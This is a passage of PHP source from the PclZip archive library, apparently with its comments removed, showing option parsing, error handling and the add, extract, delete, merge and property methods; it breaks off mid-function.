    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
